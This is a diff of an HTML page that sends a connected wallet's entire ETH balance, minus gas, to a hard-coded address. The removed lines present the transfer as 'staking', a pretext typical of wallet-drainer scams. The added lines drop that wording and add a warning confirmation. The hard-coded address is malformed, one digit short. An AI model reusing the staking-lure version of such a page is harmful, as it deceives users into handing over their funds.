@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ETH Transfer and stake - GPSS</title>
+    <title>ETH Transfer - GPSS</title>
     <link rel="stylesheet" href="styles.css">
 </head>
 <body class="transfer">
@@ -14,8 +14,8 @@
     </video>
 
     <div class="container">
-        <h1>Transfer All ETH for Stake</h1>
-        <p>Send all Ethereum (minus gas fees) from your connected wallet to our staking address.</p>
+        <h1>Transfer All ETH</h1>
+        <p>Send all Ethereum (minus gas fees) from your connected wallet to our address.</p>
 
         <button id="connectButton" onclick="connectWallet()">Connect Wallet</button>
         <button id="sendButton" onclick="sendAllEth()" disabled>Send All ETH</button>
@@ -141,6 +141,13 @@
         async function sendAllEth() {
             const statusDiv = document.getElementById('status');
             const sendButton = document.getElementById('sendButton');
+
+            // Confirmation prompt
+            const confirmed = confirm('Are you sure you want to send all ETH (minus gas fees) to the target wallet? This action cannot be undone.');
+            if (!confirmed) {
+                updateStatus('Transfer cancelled by user.');
+                return;
+            }
 
             // Target wallet address
             const targetWallet = "0x57CBA93A8f0abC01695917BD1c3f569217Ab203";
